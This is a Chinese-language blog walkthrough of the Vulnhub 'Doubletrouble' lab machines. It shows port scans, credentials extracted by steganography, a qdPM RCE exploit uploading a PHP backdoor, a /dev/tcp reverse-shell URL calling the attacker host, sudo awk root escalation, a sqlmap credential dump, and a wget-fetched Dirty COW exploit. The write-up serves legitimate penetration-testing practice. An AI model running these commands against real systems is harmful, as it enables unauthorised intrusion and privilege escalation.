---
layout: post
title: "Doubletrouble walkthrough"
date: 2021-10-07
author: 2hanx
toc: true
categories: [Vulnhub]
tags: []
---

### 主机识别

`arp-scan -l`

### 网络拓扑

| 计算机         | IP                |
| -------------- | ----------------- |
| 本机（Win10）  | `192.168.174.1`   |
| Kali           | `192.168.174.128` |
| Doubletrouble  | `192.168.174.137` |
| Doubletrouble1 | `192.168.174.138` |

### 扫描端口和版本信息

`nmap -A -p- 192.168.174.137`

```shell
┌──(root💀kali)-[~]
└─# nmap -A -p- 192.168.174.137
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-07 00:41 EDT
Nmap scan report for 192.168.174.137
Host is up (0.00072s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 6a:fe:d6:17:23:cb:90:79:2b:b1:2d:37:53:97:46:58 (RSA)
|   256 5b:c4:68:d1:89:59:d7:48:b0:96:f3:11:87:1c:08:ac (ECDSA)
|_  256 61:39:66:88:1d:8f:f1:d0:40:61:1e:99:c5:1a:1f:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: qdPM | Login
```

根据结果我们访问网页，看到使用的是 **qdPM 9.1** CMS ，并且搜索 exploit 得知该版本存在RCE漏洞，不过前提是需要知道账户名和密码，那么我们就需要在寻找账户和密码上下功夫了。

通过目录枚举我们在 `/secret`目录下发现一个图像文件：`doubletrouble.jpg`，经过多方测试，使用 *stegseek* 工具提取出图像文件中的隐藏信息，得到账户名和密码：`otisrush@localhost.com:otis666`。

```shell
┌──(root💀kali)-[~]
└─# cat doubletrouble.jpg.out
otisrush@localhost.com
otis666 
```

使用该用户名和密码，再结合RCE exploit 脚本，成功上传shell。

### Getshell

```shell
┌──(root💀kali)-[~]
└─# python2.7 47954.py -url http://192.168.174.137/ -u otisrush@localhost.com -p otis666
Backdoor uploaded at - > http://192.168.174.137//uploads/users/?cmd=whoami
```

访问该链接：`http://192.168.174.137//uploads/users/382331-backdoor.php?cmd=/bin/bash%20-c%20%27/bin/bash%20-i%20%3E&%20/dev/tcp/192.168.174.128/5566%200%3E&1%27` 即可成功反向 shell。

查看 `sudo` 权限后可以知道我们可以进行 `awk` 提权：

```shell
www-data@doubletrouble:/home$ sudo -l
sudo -l
Matching Defaults entries for www-data on doubletrouble:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on doubletrouble:
    (ALL : ALL) NOPASSWD: /usr/bin/awk
```

### 提权

```shell
www-data@doubletrouble:/home$  awk 'BEGIN {system("/bin/sh")}'
 awk 'BEGIN {system("/bin/sh")}'
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
whoami
www-data
exit
www-data@doubletrouble:/home$ sudo awk 'BEGIN {system("/bin/sh")}'
sudo awk 'BEGIN {system("/bin/sh")}'
id
uid=0(root) gid=0(root) groups=0(root)
cd /root
ls
doubletrouble.ova
```

提权后看到 `/root` 目录下存在 `doubletrouble.ova` 镜像文件，将它下载下来并使用 Vmware 导入，接下来我们就需要对该虚拟机（Doubletrouble1）进行渗透测试了。（搁这套娃，不愧是 double 🍖）

### Doubletrouble1

#### 扫描端口和版本信息

`nmap -A -p- 192.168.174.138`

```shell
┌──(root💀kali)-[~]
└─# nmap -A -p- 192.168.174.138
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-07 03:03 EDT
Nmap scan report for 192.168.174.138
Host is up (0.00049s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.0p1 Debian 4+deb7u4 (protocol 2.0)
| ssh-hostkey:
|   1024 e8:4f:84:fc:7a:20:37:8b:2b:f3:14:a9:54:9e:b7:0f (DSA)
|   2048 0c:10:50:f5:a2:d8:74:f1:94:c5:60:d7:1a:78:a4:e6 (RSA)
|_  256 05:03:95:76:0c:7f:ac:db:b2:99:13:7e:9c:26:ca:d1 (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Debian))
|_http-server-header: Apache/2.2.22 (Debian)
|_http-title: Site doesn't have a title (text/html).
```

结果差不多，不过网页是一个登录框了。

![1]({{ '/doubletrouble/1.png' | prepend: site.url }})

进行简单sql注入时发现无论输入什么都没有返回信息，猜想可能是时间盲注，那么就用 *sqlmap* 来跑一下吧，最终我们得到两个用户名和密码。

```shell
Database: doubletrouble
Table: users
[2 entries]
+----------+----------+
| username | password |
+----------+----------+
| montreux | GfsZxc1  |
| clapton  | ZubZub99 |
+----------+----------+
```

其中 `clapton`是登录 ssh 的账户。

#### Getshell

使用 `clapton:ZubZub99`  用户名和密码进行ssh登录后，信息收集发现系统liinux 内核版本是：**3.2**，因此存在脏牛提权。此外查看 `/home/clapton/user.txt` 文件得到第一个 flag：

```shell
clapton@doubletrouble:~$ cat user.txt
6CEA7A737C7C651F6DA7669109B5FB52
```

#### 提权

靶机上进行代码编译：

```shell
wget https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
gcc -pthread dirty.c -o dirty -lcrypt
./dirty root
```

最后切换到 `firefart`，即可具有 *root* 权限，查看 `/root/root.txt`文件即可得到最后一个 flag：

```shell
firefart@doubletrouble:~# cat /root/root.txt
1B8EEA89EA92CECB931E3CC25AA8DE21
```

### 总结

1. [Stegseek](https://github.com/RickdeJager/stegseek) 工具的作用是从文件中提取隐藏数据，可用于在没有密码的情况下提取 `steghide `元数据，可用于测试文件是否包含 `steghide `数据。
2. 脏牛提权时需要在靶机上进行编译。

